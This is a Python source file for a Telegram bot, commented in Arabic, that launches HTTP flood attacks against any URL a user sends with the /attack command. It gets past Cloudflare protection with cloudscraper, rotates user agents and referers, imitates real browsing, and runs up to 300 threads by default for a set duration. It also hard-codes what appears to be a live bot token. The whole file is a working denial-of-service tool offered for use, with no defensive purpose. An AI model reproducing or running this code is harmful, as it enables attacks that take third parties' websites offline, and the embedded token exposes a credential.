import random
import time
import threading
import telebot
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import cloudscraper
import urllib3

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

bot = telebot.TeleBot("7458138039:AAFSX74H91fXoRgwfqzOzp_qu9QO6vVXFmU")  # استبدل بآخر حقيقي

class AdvancedAttackTool:
    def __init__(self):
        self.active_attacks = {}
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper()
        self.session = requests.Session()
        self.session.verify = False  # تعطيل التحقق من SSL

    def _bypass_protections(self, url):
        """تجاوز أنظمة الحماية المتقدمة"""
        try:
            # استخدام تقنيات متعددة لتجاوز الحماية
            headers = {
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://www.google.com/',
                'Connection': 'keep-alive'
            }
            
            # محاولة تجاوز Cloudflare
            resp = self.scraper.get(url, headers=headers, timeout=10)
            if resp.status_code == 200:
                return resp.cookies.get_dict()
            
            # محاولة ثانية مع إعدادات مختلفة
            resp = self.session.get(url, headers=headers, timeout=10)
            return resp.cookies.get_dict() if resp.status_code == 200 else {}
            
        except Exception:
            return {}

    def _send_advanced_request(self, url, cookies):
        """إرسال طلب متطور يتجاوز الحمايات"""
        try:
            headers = {
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar;q=0.8']),
                'Referer': random.choice([
                    'https://www.google.com/',
                    'https://www.facebook.com/',
                    'https://twitter.com/'
                ]),
                'Connection': random.choice(['keep-alive', 'close'])
            }
            
            # تغيير نمط الطلبات بشكل عشوائي
            if random.random() > 0.5:
                resp = self.scraper.get(url, headers=headers, cookies=cookies, timeout=5)
            else:
                resp = self.session.get(url, headers=headers, cookies=cookies, timeout=5)
            
            # محاكاة سلوك مستخدم حقيقي
            if resp.status_code == 200:
                time.sleep(random.uniform(0.5, 2))
                
                # محاكاة النقر على روابط داخلية
                if random.random() > 0.7:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    links = [a['href'] for a in soup.find_all('a', href=True) 
                              if a['href'].startswith(('http://', 'https://'))]
                    if links:
                        secondary_url = random.choice(links)
                        self.session.get(secondary_url, headers=headers, timeout=3)
            
            return True
        except Exception:
            return False

    def start_advanced_attack(self, chat_id, url, duration=60, threads_count=300):
        """بدء هجوم متطور"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        # تجاوز أنظمة الحماية
        cookies = self._bypass_protections(url)
        if not cookies:
            return False, "❌ فشل في تجاوز أنظمة الحماية"

        stop_event = threading.Event()
        threads = []

        def advanced_attacker():
            while not stop_event.is_set():
                self._send_advanced_request(url, cookies)
                time.sleep(random.uniform(0.1, 1))  # تقليل زمن الانتظار

        # بدء خيوط الهجوم
        for _ in range(threads_count):
            t = threading.Thread(target=advanced_attacker)
            t.daemon = True
            t.start()
            threads.append(t)

        self.active_attacks[chat_id] = {
            'stop_event': stop_event,
            'threads': threads,
            'target': url,
            'start_time': time.time()
        }

        # إيقاف الهجوم بعد المدة
        threading.Timer(duration, self.stop_attack, [chat_id]).start()
        return True, f"✅ بدء الهجوم المتطور على {url} لمدة {duration} ثانية"

    def stop_attack(self, chat_id):
        """إيقاف الهجوم المتطور"""
        if chat_id in self.active_attacks:
            attack_data = self.active_attacks[chat_id]
            attack_data['stop_event'].set()
            
            # الانتظار حتى تنتهي جميع الخيوط
            for t in attack_data['threads']:
                t.join(timeout=2)
                
            elapsed = time.time() - attack_data['start_time']
            del self.active_attacks[chat_id]
            return True, f"⏹ تم إيقاف الهجوم بعد {elapsed:.2f} ثانية"
        return False, "⚠️ لا يوجد هجوم نشط"

# أوامر البوت المحسنة
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = """
    🔥 أوامر البوت المتقدم:
    /attack [رابط] [وقت] [خيوط] - بدء هجوم متطور
    /stop - إيقاف الهجوم الحالي
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "استخدم: /attack [رابط] [وقت=60] [خيوط=300]")
            return
        
        url = parts[1]
        duration = int(parts[2]) if len(parts) > 2 else 60
        threads = int(parts[3]) if len(parts) > 3 else 300
        
        tool = AdvancedAttackTool()
        success, msg = tool.start_advanced_attack(
            message.chat.id, 
            url, 
            duration,
            threads
        )
        bot.reply_to(message, msg)
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    tool = AdvancedAttackTool()
    success, msg = tool.stop_attack(message.chat.id)
    bot.reply_to(message, msg)

if __name__ == "__main__":
    print("🟢 البوت المتقدم يعمل...")
    bot.polling()
